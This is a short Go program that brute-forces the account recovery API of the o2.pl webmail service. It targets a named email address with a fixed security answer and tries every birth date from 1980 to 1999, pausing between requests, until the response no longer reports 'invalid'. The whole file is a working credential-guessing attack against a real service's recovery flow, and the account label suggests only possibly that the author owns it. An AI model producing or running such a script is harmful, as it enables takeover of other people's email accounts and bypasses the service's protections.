package main

import (
	"bytes"
	"fmt"
	"time"
	"io/ioutil"
	"net/http"
	"strings"
)

func main() {
	url := "https://poczta.o2.pl/api/v1/public/recovery/qa"

	minDay := 1;
	maxDay := 31;
	minMonth := 1;
	maxMonth := 12;
	maxYear := 1999;
	minYear := 1980;

	fmt.Println("URL:>", url)

	getAccountBack:
	for year := minYear; year <= maxYear; year++ {
		for month := minMonth; month <= maxMonth; month++ {
			for day := minDay; day <= maxDay; day++ {
				date := fmt.Sprintf("%d-%02d-%02d\n", year, month, day)
				jsonWithDate := fmt.Sprintf(`
						{
								"email": "kasek1416@o2.pl",
								"answers":["Puszek"],
								"birthDate": "%v"
						}
					`, date);

				var jsonStr = []byte(jsonWithDate);

				req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
				req.Header.Set("Content-Type", "application/json")

				client := &http.Client{}
				resp, err := client.Do(req)
					if err != nil {
						panic(err)
					}
					defer resp.Body.Close()

					fmt.Println("Checking Date:", date);
					fmt.Println("Response Status:", resp.Status)
					body, _ := ioutil.ReadAll(resp.Body)
					fmt.Println("Response Body:", string(body))

					if(!strings.Contains(string(body), "invalid")) {
						fmt.Println("GOT YA!");
						break getAccountBack
					}

				time.Sleep(10 * time.Second);
			}
		}
	}		
}
